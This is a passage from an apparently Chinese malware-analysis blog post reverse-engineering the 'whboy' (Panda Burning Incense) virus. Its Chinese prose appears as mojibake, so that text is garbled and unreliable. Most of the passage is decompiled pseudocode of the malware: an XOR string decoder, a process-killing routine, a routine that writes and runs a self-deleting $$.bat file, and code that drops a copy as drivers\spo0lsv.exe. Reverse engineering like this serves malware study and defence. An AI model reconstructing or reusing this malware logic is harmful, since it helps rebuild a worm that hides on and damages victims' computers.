è¿æ¥</span><br>  System::__linkproc__ <span class="hljs-title function_">LStrAsg</span><span class="hljs-params">(&amp;dword_40F7D4, dword_40D830)</span>;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAsg</span><span class="hljs-params">(&amp;dword_40F7D8, dword_40D85C)</span>;<br>  sub_405250(dword_40D8A0, aXboy_0);            <span class="hljs-comment">// &quot;xboy&quot;</span><br>  System::__linkproc__ <span class="hljs-title function_">LStrCmp</span><span class="hljs-params">(dword_40F7D4, v7[<span class="hljs-number">0</span>])</span>; <span class="hljs-comment">//éªŒè¯ï¼Ÿ</span><br>  <span class="hljs-keyword">if</span> ( !v0 )<br>    ExitProcess_0(<span class="hljs-number">0</span>);<br>  sub_405250(&amp;unk_40D8DC, aWhboy_0);            <span class="hljs-comment">// &quot;whboy&quot;</span><br>  v1 = System::__linkproc__ LStrCmp(dword_40D908, v6);<span class="hljs-comment">//éªŒè¯ï¼Ÿ</span><br>  <span class="hljs-keyword">if</span> ( !v0 )<br>    ExitProcess_0(<span class="hljs-number">0</span>);<br>  v2 = sub_40819C(v1);                          <span class="hljs-comment">// ä¸»ç¨‹åº1</span><br>  v3 = sub_40D18C(v2);<br>  sub_40D088(v3);<br>  <span class="hljs-keyword">while</span> ( GetMessageA(&amp;Msg, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) )          <span class="hljs-comment">// windwosæ¶ˆæ¯å¾ªç¯</span><br>    DispatchMessageA(&amp;Msg);<br>  __writefsdword(<span class="hljs-number">0</span>, v5[<span class="hljs-number">0</span>]);<br>  v4 = System::__linkproc__ LStrArrayClr(&amp;loc_40D670);<br>  System::__linkproc__ <span class="hljs-title function_">Halt0</span><span class="hljs-params">(v4)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™è¾¹æ¯”è¾ƒæ˜æ˜¾çš„å°±æ˜¯ â€œxboyâ€å’Œâ€whboyâ€ï¼ˆæ­¦æ±‰boy ?ï¼‰ä¸¤ä¸ªå­—ç¬¦ä¸²çš„éªŒè¯</p><p>odé‡Œè·Ÿç€è°ƒä¸€ä¸‹ï¼Œæ„Ÿè§‰åƒ405250åƒæ˜¯ä¸ªè§£å¯†funcï¼ŒåŒæ—¶æ ˆé‡Œé¢ä¹Ÿå‡ºç°äº†æ•æ„Ÿä¿¡æ¯</p><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251001161411.png"></p><p>405250ç‚¹è¿›å»ä¸€ä¸ªå¼‚æˆ–è´´è„¸ï¼Œé‚£decodeæ˜¯è·‘ä¸äº†äº†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">......<br><span class="hljs-keyword">if</span> ( v3 &gt; <span class="hljs-number">0</span> )<br>    &#123;<br>      v4 = <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        v6 = unknown_libname_75(v10);<br>        unknown_libname_70(&amp;v9, *(<span class="hljs-type">unsigned</span> __int8 *)(v14 + v4 - <span class="hljs-number">1</span>) ^ (*(<span class="hljs-type">unsigned</span> __int8 *)(v10 + v4 % v6) % <span class="hljs-number">0xA</span>u));<br>        System::__linkproc__ <span class="hljs-title function_">LStrCat</span><span class="hljs-params">(&amp;v11, v9)</span>;<br>        ++v4;<br>        --v3;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v3 );<br>    &#125;<br>......<br></code></pre></td></tr></table></figure><h2 id="sub-40819c"><a href="#sub-40819c" class="headerlink" title="sub_40819c"></a>sub_40819c</h2><p>é¦–å…ˆè¿›å…¥ä¸»å‡½æ•°1ï¼ŒæŠŠå‡ ä¸ªè‡ªå‘½åçš„å‡½æ•°å…ˆè¯´ä¸€ä¸‹</p><h3 id="sub-4053ac"><a href="#sub-4053ac" class="headerlink" title="sub_4053ac"></a>sub_4053ac</h3><p>æ­¤å‡½æ•°çš„è¿”å›å€¼ä¸ºå›ºå®šè¿”å›C:\Windows\System32ï¼Œæ•…é‡å‘½åä¸º GetSystemDirectory</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">GetSystemDirectory</span><span class="hljs-params">(<span class="hljs-type">int</span> *a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  CHAR Buffer[<span class="hljs-number">268</span>]; <span class="hljs-comment">// [esp+0h] [ebp-10Ch] BYREF</span><br><br>  GetSystemDirectoryA(Buffer, <span class="hljs-number">0x104</span>u);<br>  unknown_libname_112(a1, Buffer, <span class="hljs-number">261</span>);<br>  result = unknown_libname_113(*a1);<br>  <span class="hljs-keyword">if</span> ( *(_BYTE *)(*a1 + result - <span class="hljs-number">1</span>) != <span class="hljs-string">&#x27;\\&#x27;</span> )<br>    <span class="hljs-keyword">return</span> System::__linkproc__ LStrCat(a1, &amp;dword_405400);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="sub-405fc4"><a href="#sub-405fc4" class="headerlink" title="sub_405fc4"></a>sub_405fc4</h3><p>æ­¤å‡½æ•°çš„åŠŸèƒ½ä¸ºkillæŒ‡å®šè¿›ç¨‹ï¼Œæ•…é‡å‘½åä¸ºVirusKiller</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c">_DWORD *__fastcall <span class="hljs-title function_">VirusKiller</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  _DWORD *v1; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-type">void</span> *hObject; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">bool</span> i; <span class="hljs-comment">// al</span><br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// zf</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [esp-10h] [ebp-158h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v7[<span class="hljs-number">5</span>]; <span class="hljs-comment">// [esp-Ch] [ebp-154h] BYREF</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// [esp+8h] [ebp-140h] BYREF</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// [esp+Ch] [ebp-13Ch] BYREF</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [esp+10h] [ebp-138h] BYREF</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// [esp+14h] [ebp-134h] BYREF</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// [esp+18h] [ebp-130h] BYREF</span><br>  _DWORD v13[<span class="hljs-number">9</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-12Ch] BYREF</span><br>  <span class="hljs-type">int</span> v14; <span class="hljs-comment">// [esp+40h] [ebp-108h] BYREF</span><br>  <span class="hljs-type">int</span> v15; <span class="hljs-comment">// [esp+144h] [ebp-4h] BYREF</span><br>  <span class="hljs-type">int</span> savedregs; <span class="hljs-comment">// [esp+148h] [ebp+0h] BYREF</span><br><br>  v12 = <span class="hljs-number">0</span>;<br>  v10 = <span class="hljs-number">0</span>;<br>  v9 = <span class="hljs-number">0</span>;<br>  v8 = <span class="hljs-number">0</span>;<br>  v11 = <span class="hljs-number">0</span>;<br>  v15 = a1;<br>  System::__linkproc__ <span class="hljs-title function_">LStrAddRef</span><span class="hljs-params">(a1)</span>;<br>  v1 = v13;<br>  v7[<span class="hljs-number">2</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;savedregs;<br>  v7[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;loc_4060F6;<br>  v7[<span class="hljs-number">0</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)NtCurrentTeb()-&gt;NtTib.ExceptionList;<br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v7);<br>  hObject = (<span class="hljs-type">void</span> *)unknown_libname_114(<span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  v13[<span class="hljs-number">0</span>] = <span class="hljs-number">296</span>;<br>  <span class="hljs-keyword">for</span> ( i = unknown_libname_115(hObject, v13) != <span class="hljs-number">0</span>; i; i = unknown_libname_116(hObject, v13) != <span class="hljs-number">0</span> )<br>  &#123;<br>    unknown_libname_93(v15, &amp;v11);<br>    sub_405E98(v11, &amp;v12);<br>    v6 = v12;<br>    unknown_libname_112(&amp;v8, &amp;v14, <span class="hljs-number">260</span>);<br>    unknown_libname_93(v8, &amp;v9);<br>    sub_405E98(v9, &amp;v10);<br>    System::__linkproc__ <span class="hljs-title function_">LStrCmp</span><span class="hljs-params">(v6, v10)</span>;<br>    <span class="hljs-keyword">if</span> ( v4 )<br>    &#123;<br>      v1 = (_DWORD *)sub_405FA4(v13[<span class="hljs-number">2</span>]);<br>      CloseHandle_0(hObject);<br>      <span class="hljs-keyword">goto</span> LABEL_7;<br>    &#125;<br>  &#125;<br>  CloseHandle_0(hObject);<br>  LOBYTE(v1) = <span class="hljs-number">1</span>;<br>LABEL_7:<br>  __writefsdword(<span class="hljs-number">0</span>, v7[<span class="hljs-number">0</span>]);<br>  System::__linkproc__ <span class="hljs-title function_">LStrArrayClr</span><span class="hljs-params">(&amp;loc_4060FD)</span>;<br>  System::__linkproc__ <span class="hljs-title function_">LStrClr</span><span class="hljs-params">(&amp;v15)</span>;<br>  <span class="hljs-keyword">return</span> v1;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="sub-407B68"><a href="#sub-407B68" class="headerlink" title="sub_407B68"></a>sub_407B68</h3><p>æ­¤å‡½æ•°çš„åŠŸèƒ½ä¸ºå†™å…¥batæ‰¹å¤„ç†æ–‡ä»¶çš„æ“ä½œä»¥åŠå¯åŠ¨æœªè¢«æ„ŸæŸ“çš„ç¨‹åºï¼Œæ•…å°†åç§°å˜æ›´ä¸ºwritebatfile</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">writebatfile</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> _:try1_; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v9; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v11; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v12; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v13; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> _:try2_; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v15; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> _del_%<span class="hljs-number">0</span>_; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v17; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v18; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">const</span> CHAR *lpCmdLine; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> *ExceptionList; <span class="hljs-comment">// [esp-Ch] [ebp-214h] BYREF</span><br>  <span class="hljs-type">void</span> *v22; <span class="hljs-comment">// [esp-8h] [ebp-210h]</span><br>  <span class="hljs-type">int</span> *v23; <span class="hljs-comment">// [esp-4h] [ebp-20Ch]</span><br>  <span class="hljs-type">int</span> v24; <span class="hljs-comment">// [esp+4h] [ebp-204h] BYREF</span><br>  <span class="hljs-type">int</span> v25[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [esp+Ch] [ebp-1FCh] BYREF</span><br>  <span class="hljs-type">int</span> v26; <span class="hljs-comment">// [esp+14h] [ebp-1F4h] BYREF</span><br>  <span class="hljs-type">int</span> v27; <span class="hljs-comment">// [esp+1Ch] [ebp-1ECh] BYREF</span><br>  <span class="hljs-type">int</span> v28; <span class="hljs-comment">// [esp+24h] [ebp-1E4h] BYREF</span><br>  <span class="hljs-type">int</span> v29; <span class="hljs-comment">// [esp+2Ch] [ebp-1DCh] BYREF</span><br>  <span class="hljs-type">int</span> v30; <span class="hljs-comment">// [esp+30h] [ebp-1D8h] BYREF</span><br>  <span class="hljs-type">int</span> v31; <span class="hljs-comment">// [esp+34h] [ebp-1D4h] BYREF</span><br>  _BYTE v32[<span class="hljs-number">460</span>]; <span class="hljs-comment">// [esp+38h] [ebp-1D0h] BYREF</span><br>  <span class="hljs-type">int</span> v33; <span class="hljs-comment">// [esp+204h] [ebp-4h] BYREF</span><br>  <span class="hljs-type">int</span> savedregs; <span class="hljs-comment">// [esp+208h] [ebp+0h] BYREF</span><br><br>  v23 = &amp;savedregs;<br>  v22 = &amp;loc_407E31;<br>  ExceptionList = (<span class="hljs-type">char</span> *)NtCurrentTeb()-&gt;NtTib.ExceptionList;<br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;ExceptionList);<br>  System::Randomize();<br>  GetTempDir(&amp;v31);                             <span class="hljs-comment">// ä¸´æ—¶è·¯å¾„â€”â€”C:\Users\ADMINI~1\AppData\Local\Temp\</span><br><span class="hljs-comment">  v0 = unknown_libname_39(100);</span><br>  sub_40576C(v0, &amp;v30);<br>  System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v33, <span class="hljs-number">3</span>)</span>;       <span class="hljs-comment">// è·¯å¾„æ‹¼æ¥&quot;C:\Users\ADMINI~1\AppData\Local\Temp\$$.bat&quot;</span><br>  System::__linkproc__ <span class="hljs-title function_">Assign</span><span class="hljs-params">(v32, v33)</span>;        <span class="hljs-comment">// è¿æ¥</span><br>  *off_40E2BC = <span class="hljs-number">2</span>;<br>  v1 = System::__linkproc__ RewritText(v32);    <span class="hljs-comment">// å†™å…¥æ¨¡å¼æ‰“å¼€ï¼Œå‡†å¤‡å†™å…¥</span><br>  System::__linkproc__ _IOTest(v1);<br>  _:try1_ = System::__linkproc__ WriteLString((<span class="hljs-type">int</span>)v32, (<span class="hljs-type">int</span>)aTry1);<span class="hljs-comment">// &quot;:try1&quot;</span><br>  v3 = System::__linkproc__ WriteLn(_:try1_);<br>  System::__linkproc__ _IOTest(v3);<br>  ExceptionList = aDel;                         <span class="hljs-comment">// &quot;del \&quot;&quot;</span><br>  System::ParamStr(<span class="hljs-number">0</span>);<br>  System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v29, <span class="hljs-number">3</span>)</span>;       <span class="hljs-comment">// è·å–æœ¬ç¨‹åºè·¯å¾„</span><br>  v4 = System::__linkproc__ WriteLString((<span class="hljs-type">int</span>)v32, v29);<br>  v5 = System::__linkproc__ WriteLn(v4);<br>  System::__linkproc__ _IOTest(v5);<br>  ExceptionList = aIfExist;                     <span class="hljs-comment">// &quot;if exist \&quot;&quot;</span><br>  System::ParamStr(<span class="hljs-number">0</span>);<br>  System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v28, <span class="hljs-number">4</span>)</span>;       <span class="hljs-comment">// è·å–æœ¬ç¨‹åºè·¯å¾„</span><br>  v6 = System::__linkproc__ WriteLString((<span class="hljs-type">int</span>)v32, v28);<br>  v7 = System::__linkproc__ WriteLn(v6);<br>  System::__linkproc__ _IOTest(v7);<br>  ExceptionList = aRen;                         <span class="hljs-comment">// &quot;ren \&quot;&quot;</span><br>  System::ParamStr(<span class="hljs-number">0</span>);<br>  System::ParamStr(<span class="hljs-number">0</span>);<br>  sub_405534(v25[<span class="hljs-number">1</span>], &amp;v26);<br>  System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v27, <span class="hljs-number">8</span>)</span>;<br>  v8 = System::__linkproc__ WriteLString((<span class="hljs-type">int</span>)v32, v27);<br>  v9 = System::__linkproc__ WriteLn(v8);<br>  System::__linkproc__ _IOTest(v9);<br>  ExceptionList = aIfExist;                     <span class="hljs-comment">// &quot;if exist \&quot;&quot;</span><br>  System::ParamStr(<span class="hljs-number">0</span>);<br>  System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(v25, <span class="hljs-number">5</span>)</span>;<br>  v10 = System::__linkproc__ WriteLString((<span class="hljs-type">int</span>)v32, v25[<span class="hljs-number">0</span>]);<br>  v11 = System::__linkproc__ WriteLn(v10);<br>  System::__linkproc__ _IOTest(v11);<br>  ExceptionList = (<span class="hljs-type">char</span> *)::ExceptionList;<br>  System::ParamStr(<span class="hljs-number">0</span>);<br>  System::__linkproc__ <span class="hljs-title function_">LStrCatN</span><span class="hljs-params">(&amp;v24, <span class="hljs-number">3</span>)</span>;<br>  v12 = System::__linkproc__ WriteLString((<span class="hljs-type">int</span>)v32, v24);<br>  v13 = System::__linkproc__ WriteLn(v12);<br>  System::__linkproc__ _IOTest(v13);<br>  _:try2_ = System::__linkproc__ WriteLString((<span class="hljs-type">int</span>)v32, (<span class="hljs-type">int</span>)aTry2);<span class="hljs-comment">// &quot;:try2&quot;</span><br>  v15 = System::__linkproc__ WriteLn(_:try2_);<br>  System::__linkproc__ _IOTest(v15);<br>  _del_%<span class="hljs-number">0</span>_ = System::__linkproc__ WriteLString((<span class="hljs-type">int</span>)v32, (<span class="hljs-type">int</span>)aDel0);<span class="hljs-comment">// &quot;del %0&quot;</span><br>  v17 = System::__linkproc__ WriteLn(_del_%<span class="hljs-number">0</span>_);<br>  System::__linkproc__ _IOTest(v17);<br>  v18 = System::__linkproc__ Close(v32);<br>  System::__linkproc__ _IOTest(v18);<br>  ExceptionList = <span class="hljs-number">0</span>;<br>  lpCmdLine = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v33);<br>  WinExec(lpCmdLine, (UINT)ExceptionList);      <span class="hljs-comment">// è¿è¡Œbatæ–‡ä»¶</span><br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v22);<br>  System::__linkproc__ <span class="hljs-title function_">LStrArrayClr</span><span class="hljs-params">(&amp;loc_407E38)</span>;<br>  <span class="hljs-keyword">return</span> System::__linkproc__ LStrClr(&amp;v33);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å…·ä½“æµç¨‹"><a href="#å…·ä½“æµç¨‹" class="headerlink" title="å…·ä½“æµç¨‹"></a>å…·ä½“æµç¨‹</h3><p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20251001214541.png"></p><p>äºå½“å‰ç›®å½•ä¸‹ç”ŸæˆDesktop_.iniï¼Œç”ŸæˆC:\Windows\System32\drivers\spo0lsv.exeï¼ˆå¦‚æœæœ¬èº«ä¸ºC:\Windows\System32\drivers\spo0lsv.exeï¼Œåˆ™è·³è¿‡ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs c">v35 = &amp;savedregs;<br>  v34[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;loc_408781;<br>  v34[<span class="hljs-number">0</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)NtCurrentTeb()-&gt;NtTib.ExceptionList;<span class="hljs-comment">// è®¾ç½®SEH</span><br>  __writefsdword(<span class="hljs-number">0</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v34);<br>  System::ParamStr(<span class="hljs-number">0</span>);                          <span class="hljs-comment">// åœ¨ Delphi / Borland C++ è¿™ç±»ç¯å¢ƒé‡Œï¼ŒParamStr(0) æ˜¯ä¸€ä¸ªå‡½æ•°è°ƒç”¨ï¼Œä½œç”¨æ˜¯è·å– ç¨‹åºçš„å‘½ä»¤è¡Œå‚æ•°ã€‚</span><br>                                                <span class="hljs-comment">// </span><br>                                                <span class="hljs-comment">// ParamStr(N) ç”¨æ¥è·å–ç¬¬ N ä¸ªå‘½ä»¤è¡Œå‚æ•°ï¼š</span><br>                                                <span class="hljs-comment">// </span><br>                                                <span class="hljs-comment">// ParamStr(0) è¿”å› å½“å‰ç¨‹åºè‡ªèº«çš„å®Œæ•´è·¯å¾„ï¼ˆå¯æ‰§è¡Œæ–‡ä»¶åï¼‰ã€‚</span><br>                                                <span class="hljs-comment">// </span><br>                                                <span class="hljs-comment">// ParamStr(1) è¿”å› ç¬¬ 1 ä¸ªå‘½ä»¤è¡Œå‚æ•°ï¼ˆå¦‚æœæœ‰ï¼‰ã€‚</span><br>                                                <span class="hljs-comment">// </span><br>                                                <span class="hljs-comment">// ParamStr(2) è¿”å›ç¬¬ 2 ä¸ªå‚æ•°ï¼Œä»¥æ­¤ç±»æ¨ã€‚</span><br>  unknown_libname_89(v55[<span class="hljs-number">1</span>], &amp;System::AnsiString);<br>  System::__linkproc__ <span class="hljs-title function_">LStrCat</span><span class="hljs-params">(&amp;System::AnsiString, aDesktopIni)</span>;<span class="hljs-comment">// &quot;Desktop_.ini&quot;</span><br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)Sysutils::FileExists(System::AnsiString) )<span class="hljs-comment">// æ£€æŸ¥å½“å‰æ–‡ä»¶å¤¹ä¸‹æ˜¯å¦å­˜åœ¨Desktop_.ini</span><br>  &#123;<br>    System::ParamStr(<span class="hljs-number">0</span>);<br>    unknown_libname_89(v54[<span class="hljs-number">1</span>], v55);<br>    System::__linkproc__ <span class="hljs-title function_">LStrCat</span><span class="hljs-params">(v55, aDesktopIni)</span>;<span class="hljs-comment">// &quot;Desktop_.ini&quot;</span><br>    lpFileName = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v55[<span class="hljs-number">0</span>]);<br>    SetFileAttributesA(lpFileName, <span class="hljs-number">0x80</span>u);      <span class="hljs-comment">// å°†æ–‡ä»¶å±æ€§è®¾ç½®æˆFILE_ATTRIBUTE_NORMAL</span><br>    Sleep(<span class="hljs-number">1u</span>);<br>    System::ParamStr(<span class="hljs-number">0</span>);<br>    unknown_libname_89(v53[<span class="hljs-number">2</span>], v54);<br>    System::__linkproc__ <span class="hljs-title function_">LStrCat</span><span class="hljs-params">(v54, aDesktopIni)</span>;<span class="hljs-comment">// &quot;Desktop_.ini&quot;</span><br>    lpFileName_1 = (<span class="hljs-type">const</span> CHAR *)System::__linkproc__ LStrToPChar(v54[<span class="hljs-number">0</span>]);<br>    DeleteFileA(lpFileName_1);                  <span class="hljs-comment">// åˆ é™¤å½“å‰æ–‡ä»¶å¤¹ä¸‹çš„Desktop_.ini</span><br>  &#125;<br>  System::ParamStr(<span class="hljs-number">0</span>);<br>  sub_407650(v53[<span class="hljs-number">1</span>], &amp;v64, a1, a2, p_Msg);      <span class="hljs-comment">// è¯»å–ä¸€å‚çš„æ–‡ä»¶ï¼Œå­˜æ”¾åœ¨äºŒå‚æŒ‡å‘çš„åœ°å€ä¸­</span><br>  System::__linkproc__ <span class="hljs-title function_">LStrClr</span><span class="hljs-params">(&amp;v63)</span>;<br>  <span class="hljs-keyword">for</span> ( i = unknown_libname_113(v64); i &gt; <span class="hljs-number">0</span> &amp;&amp; *(_BYTE *)(v64 + i - <span class="hljs-number">1</span>); --i )<span class="hljs-comment">// unknown_libname_113()åƒæ˜¯strlençš„æ ·å­</span><br>  &#123;<br>   